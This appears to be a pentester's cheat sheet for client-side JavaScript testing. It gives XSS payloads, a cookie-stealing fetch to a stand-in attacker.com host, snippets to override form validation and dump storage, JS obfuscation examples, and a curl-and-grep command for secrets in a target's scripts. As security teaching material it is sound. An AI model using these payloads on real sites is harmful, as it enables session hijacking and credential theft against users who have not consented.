## 🎯 Common uses in pentesting

✅ **Client-side recon** – find hidden endpoints, API keys, or logic.  
✅ **Testing XSS payloads.**  
✅ **Tampering / debugging front-end validation.**  
✅ **Session hijacking or token theft.**  
✅ **Exploiting CSP weaknesses or DOM-based XSS.**  
✅ **API fuzzing / replaying AJAX calls.**

---

## 🔥 Quick XSS payloads

"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
javascript:alert(document.cookie)

```
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
javascript:alert(document.cookie)
```

---

## 🛠 Useful JS snippets for testing

// Steal cookies (lab only)
fetch("http://attacker.com/cookie?c=" + document.cookie);

// List all form fields
document.querySelectorAll('input, select, textarea').forEach(e => console.log(e));

// Override JS validation
Object.defineProperty(document.forms[0], 'onsubmit', { value: () => true });

// Dump local storage
console.log(localStorage);

// Intercept fetch
const origFetch = fetch;
fetch = function() { console.log(arguments); return origFetch.apply(this, arguments); };

```
// Steal cookies (lab only)
fetch("http://attacker.com/cookie?c=" + document.cookie);

// List all form fields
document.querySelectorAll('input, select, textarea').forEach(e => console.log(e));

// Override JS validation
Object.defineProperty(document.forms[0], 'onsubmit', { value: () => true });

// Dump local storage
console.log(localStorage);

// Intercept fetch
const origFetch = fetch;
fetch = function() { console.log(arguments); return origFetch.apply(this, arguments); };
```

---

## 🔍 Debugging / Testing Tools

|Tool|Use case|
|---|---|
|`console.log()`|Print debug info|
|`debugger;`|Triggers browser debug pause|
|Chrome DevTools|Inspect network, breakpoints|
|`JSON.stringify(obj,null,2)`|Pretty-print objects|
|Proxy tools (Burp, ZAP)|Manipulate requests|

---

## 🕸️ JS obfuscation / deobfuscation

### ✅ Obfuscate JavaScript

- [https://codebeautify.org/javascript-obfuscator](https://codebeautify.org/javascript-obfuscator "https://codebeautify.org/javascript-obfuscator")
    
    > Quick way to obfuscate simple scripts.
    

### ✅ Deobfuscate JavaScript

- [https://obf-io.deobfuscate.io/](https://obf-io.deobfuscate.io/ "https://obf-io.deobfuscate.io/")
    
    > Deobfuscate packed/minified JS.
    

---

## 📖 Example: simple obfuscation

// Original
alert('Hacked!');

// Obfuscated via codebeautify
var _0x5e45=["\x48\x61\x63\x6B\x65\x64\x21"];alert(_0x5e45[0]);

```
// Original
alert('Hacked!');

// Obfuscated via codebeautify
var _0x5e45=["\x48\x61\x63\x6B\x65\x64\x21"];alert(_0x5e45[0]);
```

---

## ⚡ Tips

✅ Check `.js` files in the site — often `/static/*.js`, `/js/app.js`, etc.  
✅ Look for hardcoded secrets, API keys, tokens.  
✅ Grep for suspicious code:

curl https://target.com/app.js | grep -iE "api|key|token|secret"

```
curl https://target.com/app.js | grep -iE "api|key|token|secret"
```

✅ Use **DevTools -> Sources** or **Network -> JS responses** to find dynamically loaded scripts.